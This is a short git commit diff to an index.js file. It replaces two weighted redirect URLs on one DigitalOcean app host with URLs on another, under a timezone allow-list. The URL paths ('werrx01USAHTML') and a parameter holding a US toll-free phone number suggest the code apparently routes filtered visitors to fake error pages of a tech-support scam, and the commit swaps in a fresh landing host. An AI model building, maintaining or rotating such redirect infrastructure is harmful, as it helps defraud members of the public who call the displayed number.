03133d6a4c0e41563354d3cd2d5694433a867ebc
paalakash <palaksh452@gmail.com>
2026-06-10 05:23:05 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,8 +31,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://plankton-app-xpzyl.ondigitalocean.app/werrx01USAHTML/?bcda=1800-209-169", weight: 0.5 },
-    { url: "https://plankton-app-xpzyl.ondigitalocean.app/werrx01USAHTML/?bcda=1800-209-169", weight: 0.5 }
+    { url: "https://lobster-app-t3z4r.ondigitalocean.app/werrx01USAHTML/?bcda=1800-209-169", weight: 0.5 },
+    { url: "https://lobster-app-t3z4r.ondigitalocean.app/werrx01USAHTML/?bcda=1800-209-169", weight: 0.5 }
 
 ];
 
